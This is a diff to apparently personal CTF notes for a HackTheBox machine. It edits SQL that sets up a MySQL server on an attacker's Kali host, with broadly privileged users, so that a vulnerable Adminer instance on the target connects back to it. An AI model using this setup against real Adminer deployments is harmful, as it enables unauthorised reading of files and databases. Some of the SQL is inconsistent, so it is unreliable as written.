@@ -23,12 +23,12 @@ go
 Stuff for adminer.php (Set up user on kali mysql to connect to remote target sql. see https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
 ```
 CREATE DATABASE 'exploitdb';
-CREATE USER exploituser@<KALIIP> IDENTIFIED BY 'Target Server';   
-GRANT ALL PRIVILEGES ON htb_admirer.* TO exploit@10.10.14.2 WITH GRANT OPTION;
-CREATE USER admirer@'%' IDENTIFIED BY 'Target Server';   
+CREATE USER exploituser@<KALIIP> IDENTIFIED BY 'PASSWORD';   
+GRANT ALL PRIVILEGES ON htb_admirer.* TO exploituser@10.10.14.2 WITH GRANT OPTION;
+CREATE USER admirer@'%' IDENTIFIED BY 'PASSWORD';   
 GRANT ALL PRIVILEGES ON exploitdb.* TO exploituser@'%' WITH GRANT OPTION;
 FLUSH PRIVILEGES;
-use htb_admirer;
+use EXPLOITDB;
 CREATE TABLE test( 
   > name  VARCHAR(255),
   > color CHAR(7),
